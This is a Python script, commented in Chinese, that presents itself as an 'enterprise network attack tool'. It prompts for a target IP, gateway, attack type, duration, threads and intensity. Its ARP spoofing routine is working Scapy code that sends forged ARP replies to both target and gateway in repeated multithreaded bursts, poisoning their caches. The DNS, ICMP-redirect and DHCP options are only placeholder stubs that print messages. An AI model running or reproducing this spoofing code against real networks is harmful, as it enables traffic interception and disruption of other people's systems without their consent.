#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
企业网络高级攻击工具 - 自定义配置版本
支持自定义配置和Y/N确认执行
"""

import threading
import time
import socket
import subprocess
import re
from scapy.all import *
import sys

class EnterpriseNetworkAttack:
    def __init__(self):
        self.attack_running = False
        
        # 配置参数
        self.config = {
            'target_ip': '',
            'gateway_ip': '',
            'attack_type': 'arp',
            'duration': 300,
            'threads': 10,
            'intensity': 'medium'
        }
        
        # 统计信息
        self.stats = {
            'packets_sent': 0,
            'targets_affected': 0,
            'start_time': None
        }
        
        # 获取本机IP
        self.local_ip = socket.gethostbyname(socket.gethostname())
    
    def get_configuration(self):
        """获取用户自定义配置"""
        print("=" * 60)
        print("          企业网络攻击工具 - 自定义配置")
        print("=" * 60)
        
        # 目标IP配置
        while True:
            target_ip = input("请输入目标IP地址 (例如: 10.30.58.185): ").strip()
            if self.validate_ip(target_ip):
                self.config['target_ip'] = target_ip
                break
            else:
                print("❌ IP地址格式不正确，请重新输入")
        
        # 网关IP配置
        while True:
            gateway_ip = input("请输入网关IP地址 (例如: 10.30.255.254): ").strip()
            if self.validate_ip(gateway_ip):
                self.config['gateway_ip'] = gateway_ip
                break
            else:
                print("❌ IP地址格式不正确，请重新输入")
        
        # 攻击类型配置
        while True:
            attack_type = input("请输入攻击类型 (arp/dns/icmp/dhcp) (默认arp): ").strip().lower()
            if attack_type in ['arp', 'dns', 'icmp', 'dhcp']:
                self.config['attack_type'] = attack_type
                break
            elif not attack_type:
                self.config['attack_type'] = 'arp'
                break
            else:
                print("❌ 请输入 arp, dns, icmp 或 dhcp")
        
        # 攻击时长配置
        while True:
            try:
                duration = int(input("请输入攻击时长(秒) (默认300): ").strip() or "300")
                if duration > 0:
                    self.config['duration'] = duration
                    break
                else:
                    print("❌ 时长必须大于0")
            except ValueError:
                print("❌ 请输入有效的数字")
        
        # 线程数配置
        while True:
            try:
                threads = int(input("请输入线程数 (默认10): ").strip() or "10")
                if 1 <= threads <= 50:
                    self.config['threads'] = threads
                    break
                else:
                    print("❌ 线程数必须在1-50之间")
            except ValueError:
                print("❌ 请输入有效的数字")
        
        # 攻击强度配置
        while True:
            intensity = input("请输入攻击强度 (low/medium/high) (默认medium): ").strip().lower()
            if intensity in ['low', 'medium', 'high']:
                self.config['intensity'] = intensity
                break
            elif not intensity:
                self.config['intensity'] = 'medium'
                break
            else:
                print("❌ 请输入 low, medium 或 high")
        
        return self.show_configuration()
    
    def validate_ip(self, ip):
        """验证IP地址格式"""
        pattern = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
        return re.match(pattern, ip) is not None
    
    def show_configuration(self):
        """显示配置信息并请求确认"""
        print("\n" + "=" * 60)
        print("          配置确认")
        print("=" * 60)
        print(f"目标IP: {self.config['target_ip']}")
        print(f"网关IP: {self.config['gateway_ip']}")
        print(f"攻击类型: {self.config['attack_type']}")
        print(f"攻击时长: {self.config['duration']}秒")
        print(f"线程数: {self.config['threads']}")
        print(f"攻击强度: {self.config['intensity']}")
        print(f"本机IP: {self.local_ip}")
        print("=" * 60)
        
        # 请求用户确认
        while True:
            confirm = input("\n确认执行企业网络攻击? (Y/N): ").strip().upper()
            if confirm == 'Y':
                return True
            elif confirm == 'N':
                print("❌ 攻击已取消")
                return False
            else:
                print("❌ 请输入 Y 或 N")
    
    def start_attack(self):
        """开始企业网络攻击"""
        print("=" * 60)
        print("          企业网络攻击开始")
        print("=" * 60)
        print(f"目标IP: {self.config['target_ip']}")
        print(f"网关IP: {self.config['gateway_ip']}")
        print(f"攻击类型: {self.config['attack_type']}")
        print(f"攻击时长: {self.config['duration']}秒")
        print(f"线程数: {self.config['threads']}")
        print(f"攻击强度: {self.config['intensity']}")
        print("=" * 60)
        
        self.attack_running = True
        self.stats['start_time'] = time.time()
        self.stats['packets_sent'] = 0
        self.stats['targets_affected'] = 0
        
        # 先进行网络分析
        self.network_analysis()
        
        try:
            # 根据攻击类型执行不同的攻击
            if self.config['attack_type'] == 'arp':
                self.arp_attack()
            elif self.config['attack_type'] == 'dns':
                self.dns_attack()
            elif self.config['attack_type'] == 'icmp':
                self.icmp_attack()
            elif self.config['attack_type'] == 'dhcp':
                self.dhcp_attack()
            
        except KeyboardInterrupt:
            print("\n[!] 用户中断攻击")
        except Exception as e:
            print(f"[-] 攻击错误: {e}")
        finally:
            self.stop_attack()
    
    def network_analysis(self):
        """深度网络分析"""
        print("\n🔍 深度网络分析")
        print("-" * 50)
        
        # 1. 网络拓扑分析
        print("1. 网络拓扑分析:")
        print(f"   本机IP: {self.local_ip}")
        print(f"   目标IP: {self.config['target_ip']}")
        print(f"   网关IP: {self.config['gateway_ip']}")
        
        # 检查网络段
        local_segment = '.'.join(self.local_ip.split('.')[:3])
        target_segment = '.'.join(self.config['target_ip'].split('.')[:3])
        
        if local_segment == target_segment:
            print("   ✅ 同一网络段")
        else:
            print(f"   ❌ 不同网络段: {local_segment} vs {target_segment}")
        
        # 2. 网关分析
        print("\n2. 网关分析:")
        try:
            # Ping网关
            result = subprocess.run(['ping', '-n', '2', self.config['gateway_ip']], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                print("   ✅ 网关可达")
            else:
                print("   ❌ 网关不可达")
        except:
            print("   ❌ 网关检查失败")
        
        # 3. 目标可达性分析
        print("\n3. 目标可达性分析:")
        try:
            result = subprocess.run(['ping', '-n', '2', self.config['target_ip']], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                print("   ✅ 目标可达")
            else:
                print("   ❌ 目标不可达")
        except:
            print("   ❌ 目标检查失败")
        
        print("-" * 50)
    
    def arp_attack(self):
        """ARP欺骗攻击"""
        print("\n[+] 开始ARP欺骗攻击...")
        
        def send_arp_spoof():
            """发送ARP欺骗包"""
            try:
                # 构造ARP欺骗包
                # 欺骗目标：我是网关
                packet1 = ARP(op=2, pdst=self.config['target_ip'], 
                             psrc=self.config['gateway_ip'], 
                             hwdst=self.get_mac_address(self.config['target_ip']))
                
                # 欺骗网关：我是目标
                packet2 = ARP(op=2, pdst=self.config['gateway_ip'], 
                             psrc=self.config['target_ip'], 
                             hwdst=self.get_mac_address(self.config['gateway_ip']))
                
                # 发送ARP包
                send(packet1, verbose=0)
                send(packet2, verbose=0)
                
                self.stats['packets_sent'] += 2
                print(f"[+] 发送ARP欺骗包 #{self.stats['packets_sent']}")
                
            except Exception as e:
                print(f"[-] ARP攻击失败: {e}")
        
        # 多线程攻击
        end_time = time.time() + self.config['duration']
        
        while self.attack_running and time.time() < end_time:
            threads = []
            
            for _ in range(self.config['threads']):
                if not self.attack_running:
                    break
                
                t = threading.Thread(target=send_arp_spoof)
                threads.append(t)
                t.start()
            
            # 等待线程完成
            for t in threads:
                t.join()
            
            # 根据强度控制发送频率
            if self.config['intensity'] == 'low':
                time.sleep(5)
            elif self.config['intensity'] == 'medium':
                time.sleep(2)
            else:  # high
                time.sleep(0.5)
    
    def dns_attack(self):
        """DNS劫持攻击"""
        print("\n[+] 开始DNS劫持攻击...")
        
        def send_dns_spoof():
            """发送DNS欺骗包"""
            try:
                # 构造DNS欺骗包
                # 这里可以添加实际的DNS劫持逻辑
                print("[+] 发送DNS欺骗包")
                self.stats['packets_sent'] += 1
                
            except Exception as e:
                print(f"[-] DNS攻击失败: {e}")
        
        # 多线程攻击
        end_time = time.time() + self.config['duration']
        
        while self.attack_running and time.time() < end_time:
            threads = []
            
            for _ in range(self.config['threads']):
                if not self.attack_running:
                    break
                
                t = threading.Thread(target=send_dns_spoof)
                threads.append(t)
                t.start()
            
            # 等待线程完成
            for t in threads:
                t.join()
            
            time.sleep(1)
    
    def icmp_attack(self):
        """ICMP重定向攻击"""
        print("\n[+] 开始ICMP重定向攻击...")
        
        def send_icmp_redirect():
            """发送ICMP重定向包"""
            try:
                # 构造ICMP重定向包
                # 这里可以添加实际的ICMP重定向逻辑
                print("[+] 发送ICMP重定向包")
                self.stats['packets_sent'] += 1
                
            except Exception as e:
                print(f"[-] ICMP攻击失败: {e}")
        
        # 多线程攻击
        end_time = time.time() + self.config['duration']
        
        while self.attack_running and time.time() < end_time:
            threads = []
            
            for _ in range(self.config['threads']):
                if not self.attack_running:
                    break
                
                t = threading.Thread(target=send_icmp_redirect)
                threads.append(t)
                t.start()
            
            # 等待线程完成
            for t in threads:
                t.join()
            
            time.sleep(1)
    
    def dhcp_attack(self):
        """DHCP欺骗攻击"""
        print("\n[+] 开始DHCP欺骗攻击...")
        
        def send_dhcp_spoof():
            """发送DHCP欺骗包"""
            try:
                # 构造DHCP欺骗包
                # 这里可以添加实际的DHCP欺骗逻辑
                print("[+] 发送DHCP欺骗包")
                self.stats['packets_sent'] += 1
                
            except Exception as e:
                print(f"[-] DHCP攻击失败: {e}")
        
        # 多线程攻击
        end_time = time.time() + self.config['duration']
        
        while self.attack_running and time.time() < end_time:
            threads = []
            
            for _ in range(self.config['threads']):
                if not self.attack_running:
                    break
                
                t = threading.Thread(target=send_dhcp_spoof)
                threads.append(t)
                t.start()
            
            # 等待线程完成
            for t in threads:
                t.join()
            
            time.sleep(1)
    
    def get_mac_address(self, ip):
        """获取MAC地址"""
        try:
            # 使用ARP请求获取MAC地址
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            
            return answered_list[0][1].hwsrc
        except:
            return "ff:ff:ff:ff:ff:ff"  # 默认广播地址
    
    def stop_attack(self):
        """停止攻击"""
        if self.attack_running:
            print("\n[+] 停止企业网络攻击...")
            self.attack_running = False
            
            # 显示统计信息
            elapsed = time.time() - self.stats['start_time']
            print(f"\n[+] 攻击统计:")
            print(f"    - 总运行时间: {int(elapsed)}秒")
            print(f"    - 发送包数: {self.stats['packets_sent']}")
            print(f"    - 影响目标数: {self.stats['targets_affected']}")

def main():
    """主函数"""
    try:
        attack = EnterpriseNetworkAttack()
        
        # 获取配置并确认
        if attack.get_configuration():
            attack.start_attack()
        
    except KeyboardInterrupt:
        print("\n[!] 程序被用户中断")
    except Exception as e:
        print(f"[-] 程序错误: {e}")

if __name__ == "__main__":
    main()